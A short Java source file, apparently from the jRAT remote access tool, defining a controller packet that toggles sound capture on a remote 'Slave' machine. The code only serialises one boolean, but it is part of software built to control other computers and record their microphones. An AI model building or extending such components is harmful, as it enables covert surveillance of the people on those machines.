package se.jrat.controller.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.controller.Slave;


public class Packet84ToggleSoundCapture extends AbstractOutgoingPacket {

	private boolean enable;

	public Packet84ToggleSoundCapture(boolean enable) {
		this.enable = enable;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		dos.writeBoolean(enable);
	}

	@Override
	public byte getPacketId() {
		return 84;
	}

}
